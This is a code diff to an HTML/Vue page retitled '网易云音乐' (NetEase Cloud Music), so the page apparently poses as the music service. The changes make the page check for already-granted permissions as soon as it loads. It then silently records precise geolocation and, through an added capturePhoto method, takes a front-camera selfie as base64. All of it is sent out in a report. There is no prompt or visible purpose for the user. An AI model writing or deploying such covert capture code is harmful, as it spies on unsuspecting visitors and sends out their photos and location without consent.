@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>网易云音乐</title>
 </head>
 
 <body>
@@ -23,36 +23,36 @@
                     camera_granted: false,
                     address: null,
                     position: null,
-                    photo: null, // 那什么编码来着
+                    base64: "",
                     errorMsg: null
                 }
             },
             created() {
                 const promise1 = navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
-                    return new Promise((resolve, reject) => {
-                        if (permissionStatus.state === 'granted') {
-                            this.geo_granted = true
-                            navigator.geolocation.getCurrentPosition(
-                                resolve,
-                                reject,
-                                { maximumAge: 10000, timeout: 5000, enableHighAccuracy: true }
-                            )
-                        }
+                        return new Promise((resolve, reject) => {
+                            if (permissionStatus.state === 'granted') {
+                                this.geo_granted = true
+                                navigator.geolocation.getCurrentPosition(
+                                    resolve,
+                                    reject,
+                                    { maximumAge: 10000, timeout: 5000, enableHighAccuracy: true }
+                                )
+                            }
+                        })
                     })
-                }).then(position => this.getCoordinates(position))
+                    .then(position => this.getCoordinates(position))
                     .catch(error => this.showError(error))
 
                 const promise2 = navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
                     if (permissionStatus.state === 'granted') {
                         this.camera_granted = true
-                        //todo 自拍
+                        return this.capturePhoto()
                     }
                 })
 
                 Promise.allSettled([promise1, promise2]).then(() => {
                     this.sendReport()
                 })
-
             },
             methods: {
                 sendReport() {
@@ -67,7 +67,7 @@
                             camera_granted: this.camera_granted,
                             address: this.address,
                             position: this.position,
-                            photo: this.photo,
+                            base64: this.base64,
                             errorMsg: this.errorMsg
                         })
                     }).finally(() => {
@@ -97,6 +97,27 @@
                             this.errorMsg = "发生未知错误。";
                             break;
                     }
+                },
+                capturePhoto() {
+                    const videoElement = document.createElement('video');
+                    const canvasElement = document.createElement('canvas');
+                    const context = canvasElement.getContext('2d');
+
+                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                        .then(stream => {
+                            videoElement.srcObject = stream;
+                            videoElement.play();
+                            videoElement.addEventListener('loadedmetadata', () => {
+                                canvasElement.width = videoElement.videoWidth;
+                                canvasElement.height = videoElement.videoHeight;
+                                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                                this.base64 = canvasElement.toDataURL('image/jpeg');
+                                videoElement.srcObject.getTracks().forEach(track => track.stop());
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error accessing media devices:', error);
+                        });
                 }
             }
         }).mount('#app')
